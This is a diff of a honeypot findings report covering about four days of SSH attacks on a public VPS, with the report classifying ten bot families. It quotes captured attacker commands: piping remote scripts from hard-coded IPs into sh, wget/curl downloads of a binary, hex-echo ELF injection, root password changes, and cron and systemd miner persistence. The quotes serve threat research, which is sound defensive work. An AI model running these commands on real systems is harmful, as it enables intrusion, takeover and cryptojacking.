@@ -1,194 +1,132 @@
-# Findings -- 93h live on a public VPS
+# Findings -- 95h on a public VPS
 
-Helsinki VPS, port 22 redirected to the honeypot. No prior reputation, fresh IP.
-Data collected: 2026-05-26 11:32 UTC to 2026-05-30 09:10 UTC.
+Helsinki VPS, port 22, fresh IP, no prior reputation.
+Data: 2026-05-26 11:32 UTC to 2026-05-30 12:00 UTC.
 
 ```
-3297 auth attempts
- 180 unique source IPs
+3306 auth attempts
+ 181 unique source IPs
 1928 unique passwords tried
- 509 sessions accepted
- 880 commands captured
+ 510 sessions accepted
 ```
 
 ---
 
-## What hit us and when
+## Timeline
 
-Activity was not continuous -- it came in waves. Two major spikes separated by a
-genuine quiet period on 2026-05-28.
+Not continuous. Two big waves, one quiet day.
 
 ```
-2026-05-26   88 commands  -- first bots arrive, mixed families
-2026-05-27  545 commands  -- Diicot wave, heaviest day
-2026-05-28   10 commands  -- quiet period
-2026-05-29   90 commands  -- new families appear (C2 dropper, VPS scout)
+2026-05-26   88 commands  -- first bots, mixed families
+2026-05-27  545 commands  -- Diicot heavy day
+2026-05-28   10 commands  -- quiet
+2026-05-29   90 commands  -- threshold=1 deployed, new families appear
+2026-05-30   --           -- new deploy, family 10 in 17min
 ```
 
-Peak hour: 22:00 UTC (1270 attempts in one hour on 2026-05-27).
+Peak: 22:00 UTC, 1270 attempts in one hour (2026-05-27).
 
-Almost all clients identify as `SSH-2.0-Go` -- the scanning ecosystem is almost entirely
-built on Go's `golang.org/x/crypto/ssh` library, used directly without OpenSSH. It has
-no overhead, no config files, and can open thousands of connections per second.
+Almost everything is `SSH-2.0-Go` -- the scanning ecosystem runs on Go's ssh library.
+No OpenSSH overhead, thousands of connections per second from a laptop.
 
 ---
 
 ## Attack families
 
-### 1. Credential stuffing (mass scanner)
+### 1. Credential stuffing
 
-The baseline of everything. A bot with a wordlist tries every (username, password) pair
-against as many servers as possible.
+A wordlist + a script that tries every password on every IP it can reach. That's it.
 
-Top passwords seen: `123456`, `admin`, `postgres`, `password`, `1234`, `root`, `test`.
-These come from the RockYou wordlist -- 14 million passwords from a 2009 breach that
-became the industry standard for this kind of spray.
+Works because people reuse passwords. A breach at site A leaks millions of real passwords.
+Some of those work at site B. The bot doesn't know your password -- it knows A password
+that has a decent chance of being yours.
 
-One bot (`71.227.179.172`) tried 1545 unique passwords. It also ran a sequential numeric
-spray: `1` -> `12` -> `123` -> `1234` -> ... -> `123456`. Testing every numeric prefix
-on the assumption that some users pick the shortest string that satisfies a length policy.
+Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`. All from the RockYou
+wordlist, 14 million passwords from a 2009 breach, still the standard.
 
-The Chinese date passwords are interesting: ~80 passwords in the format `YYYYMMDD`
-(e.g. `19870825`, `19831215`) mixed with romanized Chinese names (`yangchao`, `wangming`,
-`xiaodong`). Dates cluster in the 1982-1991 birth year range. This is a targeted spray
-using a dataset from a Chinese data breach -- the bot is not guessing, it's replaying
-real credentials from a specific leak.
+One IP (`71.227.179.172`) tried 1545 passwords then made 1382 more after getting in.
+It's not stopping when it gets a shell -- it wants every working credential, not just one.
 
-**Credential feedback loop:** `71.227.179.172` made 1382 more attempts after the first
-shell was accepted. The bot doesn't stop when it gets in -- it exhausts the entire
-wordlist to find every working credential on the server. The operator is building a
-database of `(IP, credential)` pairs, not just gaining access once.
+One bot sent ~80 passwords in `YYYYMMDD` format (19870825, 19831215...) mixed with
+Chinese names (yangchao, wangming, xiaodong). Birth years 1982-1991. That's a real
+breach dataset from China, not guessing.
 
 ---
 
-### 2. Diicot -- GPU miner dropper
+### 2. Diicot -- GPU miner
 
-The most active family. ~180 sessions, 545 of 690 commands. Objective: deploy a
-Monero cryptocurrency miner on GPU-equipped Linux servers.
+Dominant family. ~180 sessions. Wants to mine Monero on GPU servers.
 
-Monero is the currency of choice because it is CPU/GPU minable and untraceable. A
-compromised server with a GPU generates real income. The bot is selective -- it only
-deploys if the hardware is worth the effort.
+Monero = cryptocurrency, untraceable, GPU-minable. A Tesla T4 makes real money mining it.
+The bot is picky -- it only deploys on machines worth mining on.
 
-**The kill chain, step by step:**
+Kill chain:
 
 ```bash
-# Step 1 -- OS fingerprint
-uname -s -v -n -r -m
-uname -m
+uname -s -v -n -r -m    # is it Linux x86_64? if not, exit
+nproc                    # CPU count
+lspci | egrep VGA && lspci | grep 3D    # GPU on the PCI bus?
+nvidia-smi -q | grep "Product Name"     # which GPU exactly?
 ```
-Checks: is this Linux? What kernel? What architecture (x86_64, ARM)?
-If not Linux x86_64, the bot exits -- the miner binary only runs there.
+
+Our fake `lspci` shows a Tesla T4. That triggered the next step:
 
 ```bash
-# Step 2 -- CPU and GPU detection
-nproc
-lspci | egrep VGA && lspci | grep 3D
-```
-`nproc` counts CPU cores. `lspci` lists hardware on the PCI bus -- GPUs appear as
-"VGA compatible controller" or "3D controller". This decides whether it's worth continuing.
-
-Our fake `lspci` output included a Tesla T4 entry. The Tesla T4 is a $2000 NVIDIA
-data center GPU. That's exactly what the bot is hunting.
-
-```bash
-# Step 3 -- GPU model confirmation
-uname -n | awk '{printf $1}'
-uname -r | awk '{printf $1}'
-nvidia-smi -q | grep "Product Name" | awk '{print $4, $5, $6, $7}' | wc -l | head
-nvidia-smi -q | grep "Product Name"
-```
-`nvidia-smi` is NVIDIA's management tool. The bot parses the exact GPU model and likely
-reports it back to a C2 server to calculate expected hash rate and prioritize targets.
-Our fake output confirmed a Tesla T4 -- this triggered step 4.
-
-```bash
-# Step 4 -- deploy
-crontab -r
-chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
-cd /var/tmp
-rm -rf /dev/shm/.x /...
+crontab -r                              # wipe all cron jobs
+chattr -iae ~/.ssh/authorized_keys      # make authorized_keys immutable
+rm -rf /dev/shm/.x /...                # kill competing miners
 ```
 
-- `crontab -r` wipes all scheduled jobs, including any persistence set by previous owners
-  or competing attackers.
-- `chattr -iae ~/.ssh/authorized_keys` is the key move. `chattr` sets filesystem-level
-  attributes that sit below normal permissions -- even root cannot modify an immutable file
-  without first removing the attribute. The `-i` flag makes the file immutable. Once this
-  runs, no other attacker can add their SSH key. The machine is locked to this operator.
-- The `rm -rf` kills other miners already running on the machine.
+`chattr -i` is below normal Unix permissions -- even root can't touch that file without
+removing the flag first. Once this runs, no other attacker can add their SSH key.
+The machine is claimed.
 
-After this the bot would download and run the miner binary. We captured everything up to
-that point -- the actual download command was not logged because our fake shell doesn't
-implement outbound network calls.
-
-**Why "Diicot":** this malware family was named by security researchers after identifying
-it in the wild. The name is a nod to Romania's anti-organized-crime directorate -- a troll
-by the malware author, who left Romanian strings in the code.
+Named after Romania's anti-corruption agency -- the malware author is trolling.
 
 ---
 
 ### 3. SCP dropper
 
-One session on 2026-05-26 17:50. Objective: upload a payload binary to the target.
+One session 2026-05-26 17:50. Tried 11 directories looking for a writable path:
 
 ```bash
 mkdir /lib/xlxeavrjsw      ; scp -t -r /lib/xlxeavrjsw/
-mkdir .qjtfhsqhxjk         ; scp -t -r .qjtfhsqhxjk/
-mkdir /dev/lafwbeecslp      ; scp -t -r /dev/lafwbeecslp/
 mkdir /dev/shm/omlvyoqxmgd ; scp -t -r /dev/shm/omlvyoqxmgd/
-mkdir /var/volatile/...     ; scp -t -r /var/volatile/.../
 mkdir /tmp/cygmfsqpwkgd    ; scp -t -r /tmp/cygmfsqpwkgd/
-mkdir /sys/tskrwknnyggr    ; scp -t -r /sys/tskrwknnyggr/
-mkdir /var/lib/kvpysjxovqw ; scp -t -r /var/lib/kvpysjxovqw/
-mkdir /root/xhysbowadep    ; scp -t -r /root/xhysbowadep/
-mkdir /etc/nfhqychmmxtl    ; scp -t -r /etc/nfhqychmmxtl/
-mkdir /var/log/mvqvifbyeug ; scp -t -r /var/log/mvqvifbyeug/
+# ... 8 more
 ```
 
-`scp -t` is the server-side SCP receive mode -- the bot is trying to push a file from
-its own machine onto ours. It tries 11 directories in sequence, ordered by likelihood
-of being writable (`/dev/shm` and `/tmp` are usually world-writable on Linux, while
-`/lib` and `/etc` require root).
+`scp -t` = server-side receive mode. The bot pushes a file from its machine to ours.
+Random 10-char dir names to avoid collisions.
 
-The 10-character random directory names avoid collision with existing paths.
-
-The honeypot speaks the SCP wire protocol server-side (sends the ready byte, parses
-file headers, acks each step), so the bot believed all 11 uploads succeeded. No actual
-payload was received -- the file data stream was drained to discard.
+The honeypot speaks the SCP wire protocol (sends the ready byte, parses headers, acks),
+so the bot thought all 11 uploads worked. Nothing was actually received.
 
 ---
 
-### 4. Password changer -- exclusivity bot
+### 4. Password changer
 
-Four sessions between 2026-05-26 22:xx and 2026-05-27 01:xx.
+4 sessions, 2026-05-26 22:xx to 2026-05-27 01:xx.
 
 ```bash
-uname -a
 cat /etc/passwd
 passwd
 echo 'root:$MWtB6=$e6mK#=E' | chpasswd
 ```
 
-The bot reads `/etc/passwd` to confirm it has a real Linux system, then changes the
-root password. `passwd` is tried first (interactive -- it would ask for the current
-password on a real terminal). When that fails, it falls back to `chpasswd`, which reads
-`username:password` from stdin and sets the password non-interactively.
+Changes the root password to lock out other attackers. Tries interactive `passwd` first,
+falls back to `chpasswd` which reads from stdin -- no terminal needed.
 
-Two passwords observed: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Both are strong
-and clearly machine-generated. The bot does not reuse simple wordlist entries for this --
-it generates a unique password so the locked machine is exclusively its.
-
-The logic: the internet is full of bots scanning the same IP ranges. If this bot gets
-in, another bot will too within minutes. Changing the root password is a competitive
-move -- lock the door so nobody else can use the machine.
+Passwords seen: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Strong, machine-generated.
+The logic: bots are scanning the same ranges simultaneously. Get in first, change the
+password, nobody else can use the machine.
 
 ---
 
-### 5. C2 dropper -- fileless execution
+### 5. C2 dropper -- fileless
 
-First appeared 2026-05-29 after switching to `auth-threshold=1`. Multiple source IPs,
-same payload. The most dangerous pattern observed.
+First appeared 2026-05-29 07:56, 1h41m after switching to threshold=1.
+Multiple IPs, same payload.
 
 ```bash
 uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
@@ -196,173 +134,175 @@ uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
  || curl -sk https://14.46.136.77/sh) | sh -s ssh
 ```
 
-Three things in one line:
+Three things:
+- `uname -a` -- OS info sent back to C2
+- `echo -e "\x61..."` -- decodes to `auth_ok`. Signals the C2 that auth worked.
+- `wget ... | sh` -- downloads a script and runs it directly in memory. Nothing on disk.
 
-**`uname -a`** -- OS fingerprint. Output is captured by the attacker's C2 server
-through the SSH session stream.
+No file = nothing for antivirus to find. The script runs and exits, only evidence is
+in memory and process table while running.
 
-**`echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"`** -- hex decodes to `auth_ok\n`.
-This is a beacon: a signal to the C2 server that authentication succeeded and a shell
-is available. The C2 listens for this string. When it arrives, the IP is marked as
-compromised and added to the operator's inventory.
+`-s ssh` tells the script how it got in. Same dropper used for web exploits and RCE --
+the entry vector changes what persistence it sets up.
 
-**`wget ... | sh -s ssh`** -- downloads a shell script from `14.46.136.77/sh` and
-pipes it directly into `sh`. Nothing is written to disk at any point. The script
-executes in memory and exits. Traditional endpoint security tools scan the filesystem
-for malicious files -- if there is no file, there is nothing to scan. This technique
-is called fileless malware or "living off the land".
-
-The `-s ssh` argument tells the script its entry vector. The same dropper script is
-likely reused across web exploits, RCE vulnerabilities, and SSH compromise -- the
-entry vector affects what persistence mechanism the script sets up.
-
-`wget` and `curl` are tried in sequence as a fallback -- `wget` is more common on
-minimal Linux installs, `curl` on desktop-oriented distributions.
-
-This bot ran via SSH exec channel (not an interactive shell). The exec channel is
-SSH's mechanism for running a single command without opening a terminal session.
-Faster, cleaner, and invisible to any logging that only watches the interactive shell.
-Our original analysis scripts missed every command from this family entirely.
+Ran via SSH exec channel (not interactive shell) -- the original scripts missed it entirely.
 
 ---
 
-### 6. w.sh / astats -- dual persistence bot
+### 6. w.sh / astats -- persistence bot
 
-First appeared 2026-05-29 14:17 UTC under threshold=1. Hits every ~30-45min from
-different IPs -- botnet spray. Most sophisticated persistence in the dataset.
+First 2026-05-29 14:17. Hits every 30-45min from different IPs.
 
-Kill chain:
-1. Find writable dir: tries /dev/shm, /tmp, /var/run, /mnt, /root, / in order
-2. Drop w.sh to /tmp, chmod +x
-3. Cron persistence: adds /tmp/w.sh "astats" "netai" "kstats" to crontab
-4. Systemd user service: ~/.config/systemd/user/watcher-netai.service
-5. Check if already running: ps aux | grep astats
-6. Drop miner binary named astats to /dev/shm or /tmp
+```bash
+# find writable dir
+sh -c 'for d in /dev/shm /tmp /var/run ...; do cd "$d" && pwd && break; done'
+# drop script
+cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+# cron persistence
+CRON="$(crontab -l 2>/dev/null || true)"
+# systemd persistence
+sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service'
+# drop miner
+cat > astats
+```
 
-Two persistence mechanisms simultaneously -- cron + systemd. If one is removed the
-other revives it. Process names (astats, netai, kstats) chosen to look like monitoring
-tools in ps aux. Zero sessions before threshold=1 -- confirmed single-shot family.
+Two persistence mechanisms at once -- cron AND systemd user service. Remove one,
+the other revives the miner.
+
+Process names: `astats`, `netai`, `kstats`. Look like monitoring tools in `ps aux`.
 
 ---
 
 ### 7. VPS infrastructure scout
 
-Two sessions: 2026-05-29 09:48 and 14:55. 35 commands per session, no payload deployed.
-Objective: assess the machine for deployment suitability.
+Two sessions 2026-05-29. 35 commands, no payload.
 
-Covers: identity (id, whoami), user list (/etc/passwd, /etc/shadow), CPU model, distro
-detection (which apt/yum/pacman/zypper), network (netstat, ip addr, ss), write permission
-test (echo > /tmp/test_XXXX then rm), outbound connectivity (ping 8.8.8.8), running
-services (systemctl, ps), disk I/O benchmark (dd bs=1M count=10), shell history.
+Checks everything: CPU model, distro (apt/yum/pacman/zypper), network interfaces,
+running services, shadow file, disk I/O with `dd`, outbound connectivity via ping.
 
-The dd benchmark is the most telling: the bot measures disk throughput before deciding
-to deploy. Ended without payload -- machine failed some criterion (no GPU, wrong distro,
-disk too slow) or is a pure probe that reports back to a queue.
+The `dd bs=1M count=10` benchmark is the tell -- it's measuring disk speed before
+deciding if the machine is worth deploying a miner on.
+
+Ended without deploying anything. Machine failed some criterion or it's a pure probe
+that reports back to a queue.
 
 ---
 
-### 8. SSHCHK -- C2 liveness checker
+### 8. SSHCHK -- C2 liveness check
 
-Two sessions on 2026-05-30 02:20 and 02:23 UTC, different IPs, same tool.
+2026-05-30 02:20 and 02:23. Two sessions, different IPs, 3 min apart.
 
 ```bash
 echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; \
 df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
 ```
 
-The most structured C2 interaction in the dataset. Four components:
+Four things:
+- `BEGIN`/`END` markers -- C2 extracts everything between them. Token is unique per
+  session, prevents replay attacks.
+- `uname -srm` -- OS + kernel + arch
+- `echo $((7*191+3))` = 1340 -- math proof-of-work. Shell must evaluate it. A fake
+  or broken shell returns the wrong answer.
+- `df -P / | awk 'NR==2{print $1}'` -- device name of root filesystem
 
-**BEGIN/END framing** -- the C2 reads output and extracts everything between the markers.
-The random hex token (5718926f9304) is unique per session -- it correlates this output
-to this exact connection and prevents replay attacks. A honeypot that cached output
-would return a mismatched token and be detected.
+No follow-up commands. Pure inventory probe -- C2 reads the output and decides
+what to send next, externally.
 
-**`uname -srm`** -- OS kernel name, release, machine arch in one call. Tighter than
-`uname -a` -- only what the C2 needs.
-
-**`echo $((7*191+3))`** -- arithmetic proof-of-work. The shell must evaluate the
-expression and return 1340. A static replay returns the wrong number. A broken shell
-returns nothing. This confirms a live, working shell before the C2 sends any payload.
-
-**`df -P / | awk 'NR==2{print $1}'`** -- root filesystem device name (/dev/sda1 etc).
-Disk presence check -- bare VMs sometimes have unusual layouts.
-
-No follow-up commands after this. The C2 reads the structured output and decides
-what to do externally. This bot is a pure inventory probe.
+We had to fix the fake shell to pass this check: add arithmetic expansion `$((expr))`,
+awk NR==N condition, df -P flag, uname -srm case.
 
 ---
 
 ### 9. Minimal OS scanner
 
-Two sessions on 2026-05-30 06:03 and 07:39 UTC. SSH-2.0-Go. Different IPs. One command:
+2026-05-30 06:03 and 07:39. Two sessions, different IPs, 1h36m apart.
 
 ```bash
 uname -s -m
 ```
 
-Returns "Linux x86_64". Bot disconnects immediately. Lightest possible post-auth probe --
-confirms OS and architecture, exits. Either a cataloguing scanner building an internet
-map, or a first-stage probe before a payload bot follows up when conditions are right.
+Just that. Gets "Linux x86_64", disconnects. Either cataloguing the internet or
+a first-stage probe before a payload bot follows up.
+
+---
+
+### 10. ELF echo injector
+
+2026-05-30 11:18. Appeared 17 minutes after deploying the new binary.
+
+```bash
+uname -s
+uname -m
+cd /tmp; rm -f amd64; wget -t 1 http://195.177.94.72:564/b/amd64
+cd /tmp; curl -O --connect-timeout 10 http://195.177.94.72:564/b/amd64
+cd /tmp; rm -f amd64; wget -t 1 http://45.88.91.135:35146/b/amd64
+cd /tmp; curl -O --connect-timeout 10 http://45.88.91.135:35146/b/amd64
+echo -e -n "\x7f\x45\x4c\x46..."    # 407 times
+```
+
+Arch check first. Then tries to download `amd64` from two C2 servers with wget+curl
+fallback on each. When downloads fail (our fake wget returns errors), it writes the
+entire binary as hex bytes via 407 echo commands -- ~6.5KB ELF executable reconstructed
+from shell commands alone.
+
+`\x7f\x45\x4c\x46` = ELF magic number. Every Linux binary starts with these 4 bytes.
+
+This is called in-band payload delivery -- the payload travels inside the attack itself,
+no separate download needed. Used when outbound HTTP is blocked. The bot carries its
+payload in memory and falls back to hex injection when the network is closed.
+
+On a real server it would then `chmod +x /tmp/amd64 && /tmp/amd64`. We didn't capture
+that -- the fake shell returned success on the echo commands but there's nothing to execute.
+
+URL logging confirmed working: both C2 URLs (`195.177.94.72:564` and
+`45.88.91.135:35146`) appeared in session.log 17 minutes after deploy.
 
 ---
 
 ## Effect of auth-threshold=1
 
-On 2026-05-29 06:15 UTC the server was redeployed with `auth-threshold=1` -- accept any
-password on the first attempt instead of the 10th.
-
-Comparing the 7.7h period before (threshold=10-equivalent) vs the 8.7h period after:
+Deployed 2026-05-29 06:15 UTC. Accept any password on first attempt.
 
 ```
-                    before    after    delta
-attempts              102       83     -19%
-unique IPs             12       21     +75%
-single-shot IPs         5       12    +140%
-accepted                8       83    +938%
-commands                6       99   +1550%
+                before    after
+attempts          102       143   +40%
+unique IPs         12        41  +242%
+single-shot         5        27  +440%
+accepted            8       143 +1688%
+commands            6       234 +3800%
+new families      none    5 new
 ```
 
-Single-shot IPs (bots that try exactly once) went from 5 to 12. These were completely
-invisible before -- one attempt, rejected, gone. With threshold=1 they get a shell and
-reveal their playbook. The C2 dropper and VPS scout families both appeared exclusively
-after this change, suggesting they are single-shot bots that give up on the first rejection.
+Families 5-10 are all single-shot -- they try once, get rejected, leave without a trace.
+Under threshold=10 they were completely invisible.
 
-The command count jump (+1550%) confirms the hypothesis: most interesting post-auth
-behavior comes from bots that only knock once.
-
-Verified in the logs: the C2 dropper first appeared at 07:56 UTC (1h41m after the
-threshold change). The VPS scout first appeared at 09:48 UTC (3h33m after). Neither
-family has a single session anywhere in the 68h before the change. This is not a
-script fix artifact -- the exec-channel fix applied equally to all periods, so if
-these bots had connected earlier their commands would show up in period 4 or 7.
-They don't. They are single-shot bots that were silently rejected and left no trace
-under the old threshold.
+Verified in logs: C2 dropper first hit at 07:56 (1h41m after change), VPS scout at
+09:48, w.sh bot at 14:17. Zero sessions of these families in the 68h before the change.
 
 ---
 
 ## What the honeypot was good at
 
-**The GPU bait worked.** Adding a fake Tesla T4 to the `lspci` output caused Diicot
-sessions to progress from step 2 (GPU check) all the way to step 4 (kill chain). Without
-bait, those sessions would have exited at "no GPU found". The bait revealed the full
-deployment sequence.
+**GPU bait worked.** Fake Tesla T4 in lspci triggered Diicot's full kill chain. Without
+it, they would have exited at "no GPU found".
 
-**The SCP handler kept bots engaged.** Speaking the SCP wire protocol server-side
-meant the dropper bot ran all 11 upload attempts instead of dying on the first rejected
-connection. We got the full directory priority list.
+**SCP handler kept bots engaged.** Speaking the wire protocol meant the SCP dropper ran
+all 11 attempts instead of dying on the first rejection.
 
 **Returning exit 0 everywhere** kept bots progressing through their playbook.
-`chpasswd`, `crontab -r`, `chattr` all returned success. A real failure code would
-cause most bots to abort early.
 
-## What we missed
+**URL logging (added late).** wget/curl now log their URL argument. Family 10 URLs
+captured within 17 minutes of deploying.
 
-**The C2 dropper payload.** The script at `14.46.136.77/sh` was piped into sh and
-executed. Since our fake shell cannot make real outbound HTTP requests, we captured
-the command but not the script content. A fake `wget`/`curl` that logs the URL and
-returns controlled content would capture the payload.
+## What I missed
 
-**Exec channel commands in the first analysis pass.** The analysis scripts only counted
-interactive shell commands (`msg=shell`) and missed every exec-channel command
-(`msg=exec`). The "0 commands" numbers reported for several periods were wrong.
-Fixed after discovering 679 exec commands that had been invisible.
+**The C2 payload at 14.46.136.77/sh** -- pipes into sh, the honeypot can't make real HTTP calls.
+
+**The amd64 binary content** -- the echo hex chunks are all logged but not decoded yet.
+To actually get the binary: concatenate all the hex chunks and decode. Would reveal what
+the miner actually is.
+
+**Interactive shell SCP** -- now fixed. Next SCP dropper session might upload for real.
+
+**$() subshell substitution** -- not implemented. Some bot commands use it and get
+empty strings back instead of the right answer.
